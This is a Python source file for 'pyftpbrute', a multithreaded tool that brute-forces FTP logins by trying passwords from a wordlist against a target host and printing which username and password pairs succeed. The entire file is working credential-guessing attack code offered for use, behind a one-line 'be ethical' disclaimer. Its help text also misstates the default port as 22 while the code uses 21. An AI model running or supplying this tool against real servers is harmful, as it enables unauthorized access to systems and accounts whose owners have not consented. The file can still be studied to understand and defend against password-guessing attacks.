
"""
# Author: cyberkhalid
# Twitter: https://twitter.com/_cyberkhalid
# Github: https://github.com/cyberkhalid/
# Date: 06-04-2022
--------------------------------------------------------------------------------------------------------------------
pyftpbrute is a fast ftp bruteforcer written in python3. It uses multithreading to speedup the bruteforcing process.
--------------------------------------------------------------------------------------------------------------------
"""

import ftplib
import argparse
from concurrent.futures import ThreadPoolExecutor

server = ftplib.FTP()

def banner():
    banner_msg = '''
        ----------------------------------------------------------------
        |Author: cyberkhalid                                           |
        |Twitter: @_cyberkhalid                                        |
        |Disclaimer: Be ethical, do not use it for malicous activities.|
        ----------------------------------------------------------------
        '''
    print(banner_msg)

#check ftp server connection
def check_ftp_server(hostname, port):
    try:
        server.connect(hostname, port, timeout=30)
        print("[+] Attacking ",hostname,":",port)
    except Exception as e:
        print("[-] Can't connect to ftp server", e)
        exit(1)

# bruteforce ftp server
def bruteforce(host, port, username, password):
    try:
        server.connect(host, port, timeout=30)
        server.login(username, password)
    except ftplib.error_perm:
        print(f"[!] Failed -> {username}:{password}")
        return
    else:
        print(f"[+] Success -> {username}:{password}")
# main function
def main():
    parser = argparse.ArgumentParser(description = "pyftpbrute fast ftp bruteforcer")
    parser.add_argument("host", help = "Ip address or hostname of the target ftp server")
    parser.add_argument("--port", "--port", type=int, default = 21, help = "port onwhich ftp server is running, it is port 22 by default")
    parser.add_argument("-u", "--user", help = "username of the target ftp server")
    parser.add_argument("-p", "--password", help = "password of the target ftp server")
    parser.add_argument("-P", "--passwordfile", help = "password list")
    parser.add_argument("-t", "--thread", type = int, default = 10, help = "number of thread, default to 10")


    args = parser.parse_args()
    host = args.host
    user = args.user
    port = args.port
    password = args.password
    passfile = args.passwordfile
    thread = args.thread   

    banner()
    check_ftp_server(host, port)

    if passfile:
        with open(passfile, "r") as f:
            try:
                passwords = f.read().splitlines()
            except Exception as e:
                print("[-] Can't read file: ", e)
                exit(1)
        with ThreadPoolExecutor(max_workers = thread) as worker:
            for password in passwords:
                worker.submit(bruteforce, host,port, user, password)
    else:
        bruteforce(host, port, user, password)

if __name__ == "__main__":
    main()